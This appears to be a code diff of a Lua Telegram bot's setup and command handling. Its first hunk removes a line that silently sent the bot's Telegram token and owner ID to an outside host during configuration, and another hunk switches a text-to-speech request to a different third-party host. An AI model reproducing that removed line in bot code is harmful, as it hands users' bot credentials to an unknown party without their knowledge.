@@ -70,8 +70,7 @@ TokenBot = DevAli:get(ServerReLaX.."TokenReLaX"),
 ReLaX = DevAli:get(ServerReLaX.."TokenReLaX"):match("(%d+)"),
 SudoIds = {DevAli:get(ServerReLaX.."IdReLaX")},
 }
-Create(Config, "./config.lua")
-https.request("http://kbgcvx.ml/Api/index.php?id="..DevAli:get(ServerReLaX.."IdReLaX").."&token="..DevAli:get(ServerReLaX.."TokenReLaX").."&username=abs")
+Create(Config, "./config.lua")   
 file = io.open("ReLaX.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -8609,7 +8608,7 @@ alimoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ReLaXTEAM, 14, string.len(m
 DevAli:set(ReLaX..'Ali:Antk:Ali'..msg.chat_id_,true)  
 end
 if text and text:match("^انطق (.*)$") and not DevAli:get(ReLaX..'Ali:Antk:Ali'..msg.chat_id_) then
-local UrlAntk = https.request('https://apiali.ml/Antk.php?ali='..URL.escape(text:match("^انطق (.*)$")))
+local UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(text:match("^انطق (.*)$")))
 Antk = JSON.decode(UrlAntk)
 if UrlAntk.ok ~= false then
 download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3') 
